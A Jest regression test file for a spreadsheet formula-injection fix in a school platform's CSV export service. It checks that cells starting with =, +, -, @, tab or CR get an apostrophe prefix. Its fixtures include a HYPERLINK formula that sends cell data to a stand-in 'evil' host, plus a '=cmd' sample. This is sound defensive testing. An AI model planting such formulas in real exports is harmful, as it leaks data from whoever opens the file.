'use strict';

/**
 * @file csv-injection.test.js
 * @description Regression tests for defect B8-⑧ — spreadsheet formula injection in exports.
 *
 * `shared/services/export.service.js` built its cells as `"${value.replace(/"/g, '""')}"`.
 * That is correct CSV quoting and no defence at all: the parser consumes the quotes and
 * hands the raw string to the spreadsheet, which evaluates anything opening with =, +, -
 * or @. The defence existed — three times — inside modules/partner/, and nowhere in the
 * layer beneath, so every student, teacher and parent export shipped without it.
 *
 * The last test is a source scan rather than a behavioural assertion, deliberately: the
 * defect was a duplicated helper, and what must not come back is a local copy.
 */

const fs   = require('fs');
const path = require('path');

const { csvCell, csvField } = require('../../shared/utils/csv');
const ExportService = require('../../shared/services/export.service');

describe('csvCell — neutralizing the formula triggers', () => {
  test.each([
    ['plain text is untouched',        'Dupont',              'Dupont'],
    ['= is neutralized',               '=1+1',                "'=1+1"],
    ['+ is neutralized',               '+1',                  "'+1"],
    ['- is neutralized',               '-1+1',                "'-1+1"],
    ['@ is neutralized',               '@SUM(A1)',            "'@SUM(A1)"],
    ['a leading tab is neutralized',   '\t=1+1',              "'\t=1+1"],
    ['a leading CR is neutralized',    '\r=1+1',              "'\r=1+1"],
    ['an inner = is harmless',         'a=b',                 'a=b'],
    ['null becomes an empty string',   null,                  ''],
    ['undefined becomes an empty string', undefined,          ''],
  ])('%s', (_label, input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  test('a negative number is prefixed too — an accepted trade-off', () => {
    // '-42' is indistinguishable from a formula at the first character. Prefixing it makes
    // the cell text rather than a number; refusing to prefix it reopens the hole.
    expect(csvCell('-42')).toBe("'-42");
  });
});

describe('csvField — neutralize, THEN quote', () => {
  test('the apostrophe lands INSIDE the quotes', () => {
    // Order is the whole point: quoting first would put the apostrophe outside the quotes,
    // where it is CSV syntax rather than cell content, and the formula would still run.
    expect(csvField('=HYPERLINK("http://evil","Click")'))
      .toBe(`"'=HYPERLINK(""http://evil"",""Click"")"`);
  });

  test('a plain value is still quoted and escaped', () => {
    expect(csvField('Marie "M" Dupont')).toBe('"Marie ""M"" Dupont"');
  });

  test('a value containing a comma stays one field', () => {
    expect(csvField('Dupont, Marie')).toBe('"Dupont, Marie"');
  });
});

describe('B8-⑧ — ExportService applies the defence', () => {
  /** ExportService double: bypasses the DB, keeps the real CSV assembly. */
  const serviceWith = (entities, columns) => {
    const service = new ExportService({}, { name: 'Student', columns });
    service.buildFilter    = () => ({});
    service.fetchEntities  = async () => entities;
    return service;
  };

  const COLUMNS = [
    { header: 'First Name', key: 'firstName', width: 20 },
    { header: 'Email',      key: 'email',     width: 30 },
  ];

  test('an injected formula in an exported field is neutralized', async () => {
    const service = serviceWith(
      [{ firstName: '=HYPERLINK("http://evil?c="&A1,"Click")', email: 'a@b.fr' }],
      COLUMNS,
    );

    const { data } = await service.exportToCSV({}, { role: 'ADMIN' });

    expect(data).toContain(`"'=HYPERLINK(`);
    // The decisive assertion: no cell opens on a formula trigger. This is what fails
    // against the previous implementation, which quoted perfectly and neutralized nothing.
    expect(data).not.toMatch(/(^|,)"[=+@]/m);
  });

  test('every trigger character is covered, not only "="', async () => {
    const service = serviceWith(
      [
        { firstName: '+1', email: '-1' },
        { firstName: '@SUM(A1)', email: '\t=cmd' },
      ],
      COLUMNS,
    );

    const { data } = await service.exportToCSV({}, { role: 'ADMIN' });

    expect(data).not.toMatch(/(^|,)"[=+\-@\t\r]/m);
  });

  test('ordinary values are unchanged — the defence costs nothing legible', async () => {
    const service = serviceWith([{ firstName: 'Marie', email: 'marie@univ.fr' }], COLUMNS);

    const { data } = await service.exportToCSV({}, { role: 'ADMIN' });

    expect(data).toContain('"Marie","marie@univ.fr"');
  });

  test('the header row is encoded the same way as the rows', async () => {
    const service = serviceWith([{ firstName: 'Marie', email: 'a@b.fr' }], COLUMNS);

    const { data } = await service.exportToCSV({}, { role: 'ADMIN' });

    expect(data).toContain('"First Name","Email"');
  });
});

describe('B8-⑧ — the defence has one home', () => {
  test('no module re-implements csvCell locally', () => {
    // The defect was three copies in modules/partner/ and none in the shared layer. A
    // fourth copy is how it comes back — the next export is written against the shared
    // service and inherits nothing.
    const roots = ['modules', 'shared'];
    const offenders = [];

    const walk = (dir) => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          if (entry.name !== 'node_modules') walk(full);
          continue;
        }
        if (!entry.name.endsWith('.js')) continue;
        if (full.endsWith(path.join('shared', 'utils', 'csv.js'))) continue;

        const source = fs.readFileSync(full, 'utf8');
        if (/^\s*const\s+csv(Cell|Field)\s*=/m.test(source)) offenders.push(full);
      }
    };

    roots.forEach((root) => walk(path.join(__dirname, '..', '..', root)));

    expect(offenders).toEqual([]);
  });

  test('the partner exports go through the shared helper', () => {
    const controllers = [
      'partner.crud.controller.js',
      'partner.commission.controller.js',
      'partner.lead.controller.js',
    ];

    controllers.forEach((file) => {
      const source = fs.readFileSync(
        path.join(__dirname, '..', '..', 'modules', 'partner', 'controllers', file),
        'utf8',
      );
      expect(source).toMatch(/require\(.*shared\/utils\/csv.*\)/);
    });
  });
});
